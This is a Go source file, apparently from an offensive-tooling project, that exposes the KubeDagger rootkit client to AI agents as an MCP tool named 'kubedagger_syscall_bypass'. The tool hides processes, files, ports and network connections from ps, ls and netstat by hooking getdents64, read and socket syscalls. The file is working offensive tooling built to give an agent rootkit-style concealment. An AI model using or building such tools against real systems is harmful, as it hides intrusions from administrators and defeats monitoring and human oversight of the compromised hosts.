package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type SyscallBypassInput struct {
	Action string `json:"action"`
	Target string `json:"target,omitempty"`
	PID    int    `json:"pid,omitempty"`
	Port   int    `json:"port,omitempty"`
	Path   string `json:"path,omitempty"`
}

type SyscallBypassTool struct {
	exec executor.Executor
}

func NewSyscallBypass(exec executor.Executor) *SyscallBypassTool {
	return &SyscallBypassTool{exec: exec}
}

func (t *SyscallBypassTool) Name() string { return "kubedagger_syscall_bypass" }

func (t *SyscallBypassTool) Description() string {
	return "Hide processes, files, and network connections from system tools by hooking getdents64, read, and socket syscalls. Makes specified resources invisible to ps, ls, netstat, and other inspection tools."
}

func (t *SyscallBypassTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["hide-process", "hide-file", "hide-port", "hide-connection", "unhide"],
				"description": "What to hide from system inspection"
			},
			"target": {
				"type": "string",
				"description": "Target name (process name, filename pattern)"
			},
			"pid": {
				"type": "integer",
				"description": "Process ID to hide"
			},
			"port": {
				"type": "integer",
				"description": "Port number to hide from netstat/ss"
			},
			"path": {
				"type": "string",
				"description": "File path to hide from directory listings"
			}
		},
		"required": ["action"]
	}`)
}

func (t *SyscallBypassTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input SyscallBypassInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Target, "target"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Path, "path"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"syscall-bypass", "--action", input.Action}
	if input.Target != "" {
		args = append(args, "--target", input.Target)
	}
	if input.PID > 0 {
		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
	}
	if input.Port > 0 {
		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
	}
	if input.Path != "" {
		args = append(args, "--path", input.Path)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger syscall-bypass failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Syscall Bypass: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Hiding active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
